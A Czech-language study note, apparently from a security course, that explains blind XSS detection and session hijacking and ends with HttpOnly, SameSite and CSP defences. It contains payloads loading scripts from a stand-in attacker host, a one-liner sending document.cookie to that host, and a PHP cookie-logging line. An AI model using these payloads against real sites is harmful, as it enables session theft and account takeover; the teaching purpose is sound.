## 👁️ 1. Blind XSS (Slepý XSS)

**Blind XSS** nastává v situaci, kdy se vložený kód spustí v rozhraní, do kterého útočník nemá přímý přístup (např. v interním administrátorském panelu při zpracování zákaznických formulářů, support tiketů nebo registrací).

- **Detekce:** Jelikož útočník nevidí výstup (neprojeví se chybová hláška ani pop-up), spoléhá se na **Out-of-Band (OOB)** volání – payload donutí prohlížeč oběti načíst skript z externího serveru.
    
- **Identifikace zranitelného pole:** Do URL adresy vzdáleného skriptu se vkládá název testovaného formulářového pole:
    

HTML

```
<script src="http://OUR_IP/fullname"></script>  <!-- Test pole fullname -->
<script src="http://OUR_IP/username"></script>  <!-- Test pole username -->
```

> 💡 **Princip:** Pokud na útočníkův server dorazí požadavek na `/username`, je potvrzeno, že zranitelné je právě pole _username_.

## 🍪 2. Krádež relace (Cookie Stealing / Session Hijacking)

Jakmile je zjištěno zranitelné pole, útočník použije JavaScript ke čtení vlastnosti `document.cookie` a jejímu odeslání na svůj server.

|**Krok**|**Popis mechanismu**|**Kód / Realizace**|
|---|---|---|
|**1. Klientský Payload**|Načtení vnějšího JS skriptu, který na pozadí vytvoří požadavkový objekt `Image` s hodnotou cookie v parametru.|`new Image().src = 'http://OUR_IP/index.php?c=' + document.cookie;`|
|**2. Odchyt na serveru**|PHP skript na serveru útočníka přijme požadavek, roztřídí řetězec cookies a zapíše jej do souboru.|`fputs($file, "IP: {$_SERVER['REMOTE_ADDR']} \| Cookie: {$cookie}\n");`|
|**3. Zneužití relace**|Vložení získaného identifikátoru relace do vývojářských nástrojů prohlížeče (_Developer Tools $\rightarrow$ Storage $\rightarrow$ Cookies_).|Obnovení stránky přihlásí útočníka pod účtem oběti.|

## 🛡️ Klíčová obranná opatření

1. **Příznak `HttpOnly`:** Nejdůležitější ochrana proti krádeži relačních cookies. Pokud je u cookie nastaven atribut `HttpOnly`, klientský JavaScript (`document.cookie`) k ní nemá přístup a XSS payload ji nemůže přečíst.
    
2. **Příznak `SameSite` (`Lax`/`Strict`):** Omezuje odesílání cookies při požadavcích z externích domén.
    
3. **Content Security Policy (CSP):** Hlavička `Content-Security-Policy` s restrikcí `script-src` zabraňuje načítání a spouštění neautorizovaných skriptů z cizích IP adres/domén.